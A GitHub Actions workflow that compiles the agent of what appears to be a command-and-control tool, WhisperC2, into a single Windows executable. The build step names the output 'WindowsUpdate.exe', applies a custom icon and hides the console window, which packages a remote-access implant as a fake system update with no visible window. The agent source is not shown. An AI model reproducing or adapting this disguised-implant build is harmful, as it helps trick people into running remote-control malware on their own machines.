name: Build WhisperC2 Windows Executable

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install nuitka

      - name: Build EXE with Nuitka (MingW64)
        uses: Nuitka/Nuitka-Action@main
        with:
          nuitka-version: main
          script-name: agent.py
          mode: onefile
          mingw64: true
          windows-icon-from-ico: 69.ico
          output-dir: dist
          output-file: WindowsUpdate.exe
          windows-disable-console: true

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: WhisperC2
          path: dist/WindowsUpdate.exe
